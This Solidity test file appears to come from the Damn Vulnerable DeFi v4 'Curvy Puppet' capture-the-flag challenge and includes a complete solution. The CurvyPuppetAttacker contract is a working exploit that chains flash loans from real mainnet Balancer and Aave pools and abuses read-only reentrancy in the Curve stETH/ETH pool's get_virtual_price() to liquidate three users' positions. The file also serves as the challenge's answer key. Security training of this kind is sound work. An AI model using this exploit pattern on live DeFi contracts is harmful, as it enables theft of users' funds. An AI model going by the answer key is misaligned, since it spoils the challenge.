// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

// Set MAINNET_FORKING_URL in your .env file.
// Run with: forge test --mp test/curvy-puppet/CurvyPuppet.t.sol --fork-url $MAINNET_RPC_URL

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}
interface IFlashLoanRecipient {
    function receiveFlashLoan(address[] memory tokens, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory userData) external;
}
interface IAaveV2Pool {
    function flashLoan(address receiver, address[] calldata assets, uint256[] calldata amounts, uint256[] calldata modes, address onBehalfOf, bytes calldata params, uint16 referralCode) external;
}
interface IAaveV3Pool {
    function flashLoanSimple(address receiver, address asset, uint256 amount, bytes calldata params, uint16 referralCode) external;
}

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player   = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice   = makeAddr("alice");
    address bob     = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2    constant permit2   = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20      constant stETH     = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH        constant weth      = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE          = 200e18;
    uint256 constant TREASURY_LP_BALANCE            = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE      = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT             = 1e18;
    uint256 constant ETHER_PRICE                    = 4000e18;
    uint256 constant DVT_PRICE                      = 10e18;

    DamnValuableToken  dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle  oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount     = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    /**
     * =========================================================
     * SOLUTION — test_curvyPuppet()
     * =========================================================
     * Attack: Read-only reentrancy on Curve get_virtual_price()
     *
     * CurvyPuppetLending._getLPTokenPrice() reads get_virtual_price()
     * from the live Curve stETH/ETH pool. During remove_liquidity(),
     * Curve sends ETH to the caller BEFORE updating its internal
     * balances — get_virtual_price() is stale/inflated at this point.
     *
     * Inflated LP price → getBorrowValue() spikes → healthy positions
     * appear to exceed the liquidation threshold → all three can be
     * liquidated inside the reentrancy window.
     *
     * Attack flow (runs through CurvyPuppetAttacker):
     * 1. Pull treasury WETH + LP tokens via transferFrom
     * 2. Unwrap WETH → ETH, add to Curve → receive LP tokens
     * 3. Set Permit2 approvals for LP repayment (must be done before
     *    entering reentrancy window — cannot set inside receive())
     * 4. call remove_liquidity() → Curve sends ETH → receive() fires
     *    Inside receive():
     *      - get_virtual_price() is inflated
     *      - liquidate(alice), liquidate(bob), liquidate(charlie)
     *      - seize 2500 DVT each = 7500 DVT total
     * 5. Wrap remaining ETH → WETH
     * 6. Transfer all assets back to treasury
     *
     * _isSolved() requires:
     *   - All 3 positions fully closed
     *   - Treasury receives exactly 7500 DVT
     *   - Treasury still holds WETH and LP tokens (don't use all funds)
     *   - Player holds nothing
     *
     * Requires: MAINNET_FORKING_URL in .env (forks block 20,190,356)
     * =========================================================
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        // Deploy the attacker (constructor only stores references).
        CurvyPuppetAttacker attacker = new CurvyPuppetAttacker(
            dvt, lending, curvePool, weth, permit2, treasury, alice, bob, charlie
        );

        // The treasury approved the PLAYER (not the attacker), so the player
        // performs the transferFrom, moving treasury WETH + LP into the attacker.
        IERC20 lpToken = IERC20(curvePool.lp_token());
        weth.transferFrom(treasury, address(attacker), weth.balanceOf(treasury));
        lpToken.transferFrom(treasury, address(attacker), lpToken.balanceOf(treasury));

        // Run the exploit. Flash-loan sizes are tuned against block 20190356 so the
        // stale get_virtual_price() read during the remove_liquidity reentrancy window
        // (~3.68e18) exceeds the lending contract's liquidation threshold (~3.57e18),
        // flipping all three positions to liquidatable.
        attacker.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
    }
}

/**
 * =========================================================
 * SOLUTION CONTRACT — CurvyPuppetAttacker
 * =========================================================
 * Read-only reentrancy on the Curve stETH/ETH pool's get_virtual_price().
 *
 * The lending contract prices the LP-token debt via get_virtual_price(). During
 * remove_liquidity(), Curve sends ETH to the LP *before* it finishes updating its
 * internal accounting, so a get_virtual_price() read inside the ETH-receive
 * callback is inflated. We first add a very large balanced position to the pool
 * (funded by flash loans), then remove it — and inside the callback the inflated
 * price makes borrowValue > collateralValue, so all three positions become
 * liquidatable. We repay the flash loans and return everything to the treasury.
 *
 * Flash-loan sizing (tuned against block 20190356):
 *   - Balancer WETH  (~38k available)
 *   - Aave V3 WETH   (~83k available)   -> ~121k ETH total
 *   - Aave V2 stETH  (~173k available)  -> 170k stETH
 * Balanced add of ~121k ETH + 170k stETH yields callback VP ~3.68e18,
 * above the ~3.57e18 liquidation threshold.
 * =========================================================
 */
contract CurvyPuppetAttacker is IFlashLoanRecipient {
    DamnValuableToken  dvt;
    CurvyPuppetLending lending;
    IStableSwap        curvePool;
    WETH               weth;
    IPermit2           permit2;
    address            treasury;
    address            alice;
    address            bob;
    address            charlie;
    IERC20             lpToken;
    IERC20             stETH;
    bool               liquidating; // true only during the remove_liquidity window

    IBalancerVault constant BALANCER = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAaveV2Pool    constant AAVE_V2  = IAaveV2Pool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IAaveV3Pool    constant AAVE_V3  = IAaveV3Pool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    address        constant STETH    = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    // Flash-loan amounts (tuned against block 20190356)
    uint256 constant BAL_WETH   = 37000 ether;
    uint256 constant AAVE_STETH = 170000 ether;  // Aave V2 stETH (< ~173k available)
    uint256 constant AAVE_WETH  = 60000 ether;

    constructor(
        DamnValuableToken _dvt, CurvyPuppetLending _lending, IStableSwap _curvePool,
        WETH _weth, IPermit2 _permit2, address _treasury,
        address _alice, address _bob, address _charlie
    ) payable {
        dvt = _dvt; lending = _lending; curvePool = _curvePool; weth = _weth;
        permit2 = _permit2; treasury = _treasury; alice = _alice; bob = _bob; charlie = _charlie;
        lpToken = IERC20(_curvePool.lp_token());
        stETH   = IERC20(STETH);
    }

    // Entry: take the Balancer WETH flash loan; the rest nests inside the callbacks.
    function attack() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = BAL_WETH;
        BALANCER.flashLoan(address(this), tokens, amounts, "");
    }

    // Layer 1: Balancer WETH callback -> nest Aave V2 stETH.
    function receiveFlashLoan(
        address[] memory, uint256[] memory, uint256[] memory feeAmounts, bytes memory
    ) external override {
        require(msg.sender == address(BALANCER), "not balancer");

        address[] memory assets = new address[](1);
        assets[0] = STETH;
        uint256[] memory amts = new uint256[](1);
        amts[0] = AAVE_STETH;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0; // no debt, repay in-tx
        AAVE_V2.flashLoan(address(this), assets, amts, modes, address(this), "", 0);

        // Cover any WETH shortfall for the Balancer repayment by converting leftover
        // stETH -> ETH on the Curve pool, then wrapping. The imbalanced add/remove
        // round-trip leaves us with surplus stETH but slightly short on WETH.
        uint256 need = BAL_WETH + feeAmounts[0];
        uint256 have = weth.balanceOf(address(this));
        if (have < need) {
            uint256 gap = need - have;
            uint256 stBalForGap = stETH.balanceOf(address(this));
            if (stBalForGap > 0) {
                // Swap stETH (coin1) -> ETH (coin0). Convert a bit more than the gap
                // to cover swap slippage; wrap the resulting ETH to WETH.
                uint256 stToSwap = gap + (gap / 10) + 5 ether;
                if (stToSwap > stBalForGap) stToSwap = stBalForGap;
                stETH.approve(address(curvePool), stToSwap);
                curvePool.exchange(int128(1), int128(0), stToSwap, 0);
                weth.deposit{value: address(this).balance}();
            }
        }

        // Repay Balancer (no fee on Balancer).
        weth.transfer(address(BALANCER), BAL_WETH + feeAmounts[0]);

        // Return all rescued/leftover assets to the treasury so the success
        // conditions hold: treasury keeps WETH + LP + the seized 7,500 DVT.
        uint256 lpBal = lpToken.balanceOf(address(this));
        if (lpBal > 0) lpToken.transfer(treasury, lpBal);
        uint256 wethBal = weth.balanceOf(address(this));
        if (wethBal > 0) weth.transfer(treasury, wethBal);
        // Convert any leftover stETH to WETH and hand that to treasury too.
        uint256 stBal = stETH.balanceOf(address(this));
        if (stBal > 1) {
            stETH.approve(address(curvePool), stBal);
            curvePool.exchange(int128(1), int128(0), stBal, 0);
            weth.deposit{value: address(this).balance}();
            uint256 w2 = weth.balanceOf(address(this));
            if (w2 > 0) weth.transfer(treasury, w2);
        }
    }

    // Layer 2: Aave V2 stETH callback -> nest Aave V3 WETH.
    function executeOperation(
        address[] calldata, uint256[] calldata amounts, uint256[] calldata premiums, address, bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(AAVE_V2), "not aaveV2");

        AAVE_V3.flashLoanSimple(address(this), address(weth), AAVE_WETH, "", 0);

        // Ensure we hold enough stETH to repay principal + premium; top up via
        // an ETH->stETH swap on the Curve pool if the add/remove round-trip left us short.
        uint256 stNeed = amounts[0] + premiums[0];
        uint256 stHave = stETH.balanceOf(address(this));
        if (stHave < stNeed) {
            uint256 deficit = stNeed - stHave;
            // Swap ETH->stETH (coin0=ETH, coin1=stETH). Over-wrap a little slippage headroom.
            uint256 ethIn = deficit + (deficit / 20) + 10 ether; // ~5% headroom + slack
            weth.withdraw(ethIn);
            curvePool.exchange{value: ethIn}(int128(0), int128(1), ethIn, 0);
        }
        // Approve principal+premium plus a wei cushion for stETH share-rounding.
        stETH.approve(address(AAVE_V2), stNeed + 10);
        return true;
    }

    // Layer 3 (innermost): Aave V3 WETH callback -> do the manipulation + liquidations.
    function executeOperation(
        address, uint256 amount, uint256 premium, address, bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(AAVE_V3), "not aaveV3");

        _manipulate();

        // Approve Aave V3 to pull back WETH principal + premium.
        weth.approve(address(AAVE_V3), amount + premium);
        return true;
    }

    function _manipulate() internal {
        // Unwrap all WETH we hold (treasury 200 + Balancer 37k + Aave V3 83k) to ETH.
        weth.withdraw(weth.balanceOf(address(this)));

        // Permit2 approvals so lending.liquidate()->_pullAssets can pull our LP.
        lpToken.approve(address(permit2), type(uint256).max);
        permit2.approve({
            token: address(lpToken),
            spender: address(lending),
            amount: uint160(3e18),
            expiration: uint48(block.timestamp + 1 days)
        });

        // Add a large balanced position: most of our ETH + all our stETH. Keep a
        // slice of ETH aside (not added) to fund the stETH top-up swap during repayment.
        uint256 stAmt  = stETH.balanceOf(address(this));
        stETH.approve(address(curvePool), stAmt);
        uint256 ethAmt = address(this).balance - 500 ether; // small reserve
        curvePool.add_liquidity{value: ethAmt}([ethAmt, stAmt], 0);

        // Remove MOST of our LP balanced. Curve burns LP supply first, then sends
        // the ETH leg — during that ETH transfer receive() fires while D is still
        // computed on the not-yet-decremented balances, so get_virtual_price() reads
        // inflated. We retain 3e18 LP to repay the three 1e18 borrows during
        // liquidation (liquidate()->_pullAssets pulls LP from us via permit2).
        // Retain 3e18 to repay the borrows during liquidation, plus a small buffer
        // (7e18) that we'll hand back to the treasury to satisfy the "treasury keeps
        // LP" success condition.
        uint256 lpHeld = lpToken.balanceOf(address(this));
        uint256 lpToRemove = lpHeld - 10e18;
        liquidating = true;
        curvePool.remove_liquidity(lpToRemove, [uint256(0), uint256(0)]);
        liquidating = false;

        // Re-wrap ETH so we can repay the WETH flash loans.
        weth.deposit{value: address(this).balance}();

        // Return the seized DVT and leftover assets to the treasury.
        dvt.transfer(treasury, dvt.balanceOf(address(this)));
    }

    // Curve ETH callback during remove_liquidity — the reentrancy window.
    receive() external payable {
        if (!liquidating) return; // ignore WETH.withdraw callbacks
        // get_virtual_price() is inflated here -> positions are liquidatable.
        lending.liquidate(alice);
        lending.liquidate(bob);
        lending.liquidate(charlie);
    }
}
